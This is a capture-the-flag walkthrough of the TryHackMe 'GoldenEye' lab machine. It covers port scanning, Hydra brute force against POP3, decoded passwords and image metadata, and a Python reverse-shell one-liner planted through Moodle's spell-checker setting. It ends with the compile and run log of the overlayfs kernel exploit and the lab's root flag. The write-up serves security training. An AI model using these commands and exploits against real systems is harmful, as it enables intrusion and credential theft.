# GoldenEye

Bond, James Bond. A guided CTF.

[GoldenEye](https://tryhackme.com/room/goldeneye)

## Topic's

- Network Enumeration
- Cryptography
  - HTML Entity
  - Base64
- Pop3 Enumeration
- Brute Force (Pop3)
- Stored Passwords & Keys
- Steganography
- CVE-2015-1328 - Linux Kernel 3.13.0 < 3.19

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Intro & Enumeration

This room will be a guided challenge to hack the James Bond styled box and get root.

Credit to creosote for creating this VM. This machine is used here with the explicit permission of the creator <3

So.. Lets get started!

1. First things first, connect to our network and deploy the machine.

`No answer needed`

2. Use nmap to scan the network for all ports. How many ports are open?

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ sudo nmap -p- -sS -sC -sV -O 10.10.74.5
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 16:32 CEST
Nmap scan report for 10.10.74.5
Host is up (0.040s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA UIDL RESP-CODES PIPELINING STLS AUTH-RESP-CODE TOP USER SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/9%OT=25%CT=1%CU=41157%PV=Y%DS=2%DC=I%G=Y%TM=5F80751
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.23 seconds
```

4. Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

[http://10.10.74.5/](http://10.10.74.5/)

```
Severnaya Auxiliary Control Station
****TOP SECRET ACCESS****
Accessing Server Identity
Server Name:....................
GOLDENEYE

User: UNKNOWN
Naviagate to /sev-home/ to login
```

[view-source:http://10.10.74.5/terminal.js](view-source:http://10.10.74.5/terminal.js)

```js
var data = [
  {
    GoldenEyeText:
      "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>",
  },
];

//
//Boris, make sure you update your default password.
//My sources say MI6 maybe planning to infiltrate.
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

  var i = 0,
    isTag,
    text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

`Boris`

5. Who needs to make sure they update their default password?

[https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()&input=JiM3MzsmIzExMDsmIzExODsmIzEwNTsmIzExMDsmIzk5OyYjMTA1OyYjOTg7JiMxMDg7JiMxMDE7JiM3MjsmIzk3OyYjOTk7JiMxMDc7JiM1MTsmIzExNDs](<https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity()&input=JiM3MzsmIzExMDsmIzExODsmIzEwNTsmIzExMDsmIzk5OyYjMTA1OyYjOTg7JiMxMDg7JiMxMDE7JiM3MjsmIzk3OyYjOTk7JiMxMDc7JiM1MTsmIzExNDs>)

`InvincibleHack3r`

6. Whats their password?
7. Now go use those credentials and login to a part of the site.

## Task 2 Its mail time...

Onto the next steps..

1. Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ telnet 10.10.74.5 55007
Trying 10.10.74.5...
Connected to 10.10.74.5.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER
+OK
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
quit
+OK Logging out
Connection closed by foreign host.
```

3. If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ hydra -l natalya -P /usr/share/wordlists/rockyou.txt pop3://10.10.74.5:55007
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-24 17:02:37
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.7.77:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.7.77   login: natalya   password: bird
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-24 17:04:56
```

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.74.5:55007
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-24 17:14:58
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.7.77:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.7.77   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-24 17:17:38
```

5. Inspect port 55007, what services is configured to use this port?

`telnet`

6. Login using that service and the credentials you found earlier.

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ telnet 10.10.74.5 55007
Trying 10.10.74.5...
Connected to 10.10.74.5.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
```

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ telnet 10.10.74.5 55007
Trying 10.10.74.5...
Connected to 10.10.74.5.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
```

7. What can you find on this service?

`emails`

8. What user can break Boris' codes?

```
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
  by ubuntu (Postfix) with ESMTP id D5EDA454B1
  for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
```

9.  Using the users you found on this service, find other users passwords

```
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
  by ubuntu (Postfix) with SMTP id 17C96454B1
  for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

10. Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.

## Task 3 GoldenEye Operators Training

Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.

1. If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it. If you're on Linux edit your "/etc/hosts" file and add:

`<machines ip> severnaya-station.com`

If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file

2. Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir
3. Try using the credentials you found earlier. Which user can you login as?
4. Have a poke around the site. What other user can you find?

`doak`

5. What was this users password?

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ hydra -l doak -P /usr/share/wordlists/rockyou.txt pop3://10.10.74.5:55007
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-24 18:24:29
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.7.77:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.7.77   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-24 18:26:52
```

6. Use this users credentials to go through all the services you have found to reveal more emails.

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ telnet 10.10.74.5 55007
Trying 10.10.74.5...
Connected to 10.10.74.5.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
```

8. What is the next user you can find from doak?

`dr_doak`

9. What is this users password?

`4England!`

10. Take a look at their files on the moodle (severnaya-station.com)
11. Download the attachments and see if there are any hidden messages inside them?

```
007,

I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

12. Using the information you found in the last task, login with the newly found user.

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ wget 10.10.74.5/dir007key/for-007.jpg
--2020-10-09 17:08:18--  http://10.10.74.5/dir007key/for-007.jpg
Connecting to 10.10.74.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14896 (15K) [image/jpeg]
Saving to: ‘for-007.jpg’

for-007.jpg                                       100%[=============================================================================================================>]  14.55K  --.-KB/s    in 0.05s

2020-10-09 17:08:18 (282 KB/s) - ‘for-007.jpg’ saved [14896/14896]

kali@kali:~/CTFs/tryhackme/GoldenEye$ exiftool for-007.jpg
ExifTool Version Number         : 12.06
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:25 02:40:02+02:00
File Access Date/Time           : 2020:10:09 17:08:18+02:00
File Inode Change Date/Time     : 2020:10:09 17:08:18+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d
xWinter1995x!
```

13. As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat. Take a look into Aspell, the spell checker plugin.

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Task 4 Privilege Escalation

Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

1. Download the linuxprivchecker to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

- Download the linuxprivchecker file locally
- Navigate to the file on your file system
- Do: python -m SimpleHTTPServer 1337 (leave this running)
- On the VM you can now do: wget <your IP>/<file>.py

OR

Enumerate the machine manually.

2. Whats the kernel version?

``

3. This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

- Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
- Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
- Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
- Make su on overlayfs world writable without changing the owner
- Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
- Execute the modified su binary

You can download the exploit from here: https://www.exploit-db.com/exploits/37292

```
kali@kali:~/CTFs/tryhackme/GoldenEye$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.74.5] 35639
bash: cannot set terminal process group (1071): Inappropriate ioctl for device
bash: no job control in this shell
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ whoami
whoami
www-data
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ wget 10.8.106.222/37292.c
wget 10.8.106.222/37292.c
--2020-10-09 08:19:07--  http://10.8.106.222/37292.c
Connecting to 10.8.106.222:80... failed: Connection refused.
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ^[[A
wget 10.8.106.222/37292.c
--2020-10-09 08:19:27--  http://10.8.106.222/37292.c
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: '37292.c'

     0K ....                                                  100% 5.48M=0.001s

2020-10-09 08:19:27 (5.48 MB/s) - '37292.c' saved [5119/5119]

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ wget 10.8.106.222/37292.c
wget 10.8.106.222/37292.c
--2020-10-09 08:19:40--  http://10.8.106.222/37292.c
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: '37292.c.1'

     0K ....                                                  100% 7.50M=0.001s

2020-10-09 08:19:40 (7.50 MB/s) - '37292.c.1' saved [5119/5119]

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ls
ls
37292.c
37292.c.1
changelog.txt
classes
config.php
css
editor_plugin.js
editor_plugin_src.js
img
includes
rpc.php
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ which cc
which cc
/usr/bin/cc
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ sed -i "s/gcc/cc/g" 37292.c
<.9/plugins/spellchecker$ sed -i "s/gcc/cc/g" 37292.            c
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cc 37292.c -o exploit
cc 37292.c -o exploit
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# cat /root/.flag.txt
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

#
```

4. Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key! What development tools are installed on the machine?
5. What is the root flag?
